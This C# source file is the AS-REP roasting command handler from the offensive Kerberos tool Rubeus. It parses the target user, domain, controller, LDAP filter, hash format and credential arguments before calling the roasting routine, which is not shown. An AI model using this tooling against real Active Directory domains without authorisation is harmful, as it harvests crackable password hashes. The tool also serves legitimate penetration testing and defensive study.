using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;


namespace Rubeus.Commands
{
    public class Asreproast : ICommand
    {
        public static string CommandName => "asreproast";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Action: AS-REP roasting\r\n");

            string user = "";
            string domain = "";
            string dc = "";
            string ou = "";
            string format = "john";
            string ldapFilter = "";
            string supportedEType = "rc4";
            string outFile = "";
            bool ldaps = false;
            System.Net.NetworkCredential cred = null;

            if (arguments.ContainsKey("/user"))
            {
                string[] parts = arguments["/user"].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments["/user"];
                }
            }
            if (arguments.ContainsKey("/domain"))
            {
                domain = arguments["/domain"];
            }
            if (arguments.ContainsKey("/dc"))
            {
                dc = arguments["/dc"];
            }
            if (arguments.ContainsKey("/ou"))
            {
                ou = arguments["/ou"];
            }
            if (arguments.ContainsKey("/ldapfilter"))
            {
                // additional LDAP targeting filter
                ldapFilter = arguments["/ldapfilter"].Trim('"').Trim('\'');
            }
            if (arguments.ContainsKey("/format"))
            {
                format = arguments["/format"];
            }
            if (arguments.ContainsKey("/outfile"))
            {
                outFile = arguments["/outfile"];
            }
            if (arguments.ContainsKey("/ldaps"))
            {
                ldaps = true;
            }
            if (arguments.ContainsKey("/aes"))
            {
                supportedEType = "aes";
            }
            if (arguments.ContainsKey("/des"))
            {
                supportedEType = "des";
            }

            if (String.IsNullOrEmpty(domain))
            {
                domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }

            if (arguments.ContainsKey("/creduser"))
            {
                if (!Regex.IsMatch(arguments["/creduser"], ".+\\.+", RegexOptions.IgnoreCase))
                {
                    Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
                    return;
                }

                string[] parts = arguments["/creduser"].Split('\\');
                string domainName = parts[0];
                string userName = parts[1];

                if (!arguments.ContainsKey("/credpassword"))
                {
                    Console.WriteLine("\r\n[X] /credpassword is required when specifying /creduser\r\n");
                    return;
                }

                string password = arguments["/credpassword"];

                cred = new System.Net.NetworkCredential(userName, password, domainName);
            }
            Roast.ASRepRoast(domain, user, ou, dc, format, cred, outFile, ldapFilter, ldaps, supportedEType);
        }
    }
}